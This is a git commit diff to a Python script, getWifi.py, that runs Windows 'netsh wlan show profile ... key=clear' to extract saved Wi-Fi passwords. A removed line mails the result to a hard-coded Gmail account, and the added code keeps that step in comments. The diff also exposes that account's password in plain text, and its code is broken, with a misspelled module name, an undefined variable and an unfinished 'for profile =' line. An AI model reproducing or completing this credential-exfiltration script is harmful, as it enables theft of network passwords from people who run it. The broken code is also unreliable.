2c126e2733e3d3122efcb846920a3b9e148d74f8
benrobbins20 <72369539+benrobbins20@users.noreply.github.com>
2022-02-18 16:56:13 -0700

    Update getWifi.py

--- getWifi.py
+++ getWifi.py
@@ -1,4 +1,5 @@
-import smtplib,subprocess
+import smtplib,subprocess,re
+
 
 def sendMail(email,password,message):
     server = smptlib.SMTP('smtp.gmail.com',587)
@@ -7,7 +8,30 @@ def sendMail(email,password,message):
     server.sendmail(email,email,message)
     server.quit()
 
-cmd = 'netsh wlan show profile ' + netname + ' key=clear' #gets wifi password on windows if windows has connected to a wifi network 
-result = subprocess.check_output(cmd,shell= True)
-sendMail('benpro4433@gmail.com','burn3rp4ss',result)
+def getWifi():
+    wifiNetworks = []
+    wlanProfile = 'netsh wlan show profile'
+    wlanProfile = subprocess.check_output(wlanProfile,shell=True)
+    wlanProfile = wlanProfile.decode()
+    #print(wlanProfile)
+    if 'Profile' in str(wlanProfile):
+        netNames = re.compile('(Profile\s*:\s)(.*)')
+        netNames = re.findall(netNames,str(wlanProfile))
+        for profile in netNames:
+            print(profile[1])
+            wifiNetworks.append(profile[1])
+            for profile = 
+    return wifiNetworks
+
+print(getWifi())
+# for network in getWifi():
+#     print(network)
+#     cmd = 'netsh wlan show profile ' + network + ' key=clear'
+#     print(cmd)
+    
+    #password = subprocess.check_output('netsh wlan show profile ' + network + ' key=clear')
+
+
+
+#sendMail('benpro4433@gmail.com','burn3rp4ss',result)
 
